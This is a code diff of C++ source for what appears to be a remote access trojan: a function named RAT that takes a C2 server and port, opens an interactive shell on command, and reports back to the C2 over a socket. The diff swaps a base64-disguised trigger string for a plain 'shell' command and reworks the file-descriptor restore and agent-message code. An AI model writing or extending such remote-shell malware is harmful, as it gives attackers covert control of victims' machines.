@@ -127,8 +127,9 @@ void RAT(char* C2_Server, int C2_Port)
                 }
 
                 // Should only be used in individual interactive environments == TBC
-                if ((strcmp(command, "aSB3YW50IHNoZWxsIG5vdw") == 0))
+                if ((strcmp(command, "shell") == 0))
                 {
+                    std::cout << "Entering shell exec..." << std::endl;
 
                     int dup_orig_stdin  = dup(0);
                     int dup_orig_stdout  = dup(1);
@@ -153,25 +154,28 @@ void RAT(char* C2_Server, int C2_Port)
                         wait(NULL);
                     }
 
-                        // Recover fd's and close duplicates
-                        dup2(dup_orig_stdin,0);
-                        dup2(dup_orig_stdout,1);
-                        dup2(dup_orig_stderr,2);
+                    std::cout << "Exiting shell exec..." << std::endl;
 
-                        close(dup_orig_stdin);
-                        close(dup_orig_stdout);
-                        close(dup_orig_stderr);
 
-                        // Clear memory
-                        // memset(CommandReceived, 0, sizeof(CommandReceived));
+                    // Recover fd's and close duplicates
+                    dup2(dup_orig_stdin,0);
+                    dup2(dup_orig_stdout,1);
+                    dup2(dup_orig_stderr,2);
 
-                        // When the process exits, we send an agent-msg over to alert the C2
-                        char buffer[64] = "";
-                        strcat(buffer,"[* Agent-Msg] Exiting shell\n");
-                        send(tcp_sock,buffer,strlen(buffer) + 1, 0);
+                    close(dup_orig_stdin);
+                    close(dup_orig_stdout);
+                    close(dup_orig_stderr);
 
-                        memset(buffer, 0, sizeof(buffer));
-                        memset(CommandReceived, 0, sizeof(CommandReceived));
+                    // Clear memory
+                    // memset(CommandReceived, 0, sizeof(CommandReceived));
+
+                    // When the process exits, we send an agent-msg over to alert the C2
+                    char buffer[64] = "";
+                    strcat(buffer,"[* Agent-Msg] Exiting shell\n");
+                    send(tcp_sock,buffer,strlen(buffer) + 1, 0);
+
+                    memset(buffer, 0, sizeof(buffer));
+                    memset(CommandReceived, 0, sizeof(CommandReceived));
                 }
                 else if ((strcmp(command, "UHJvYmluZyBPcGVyYXRpbmcgU3lzdGVt") == 0))
                 {
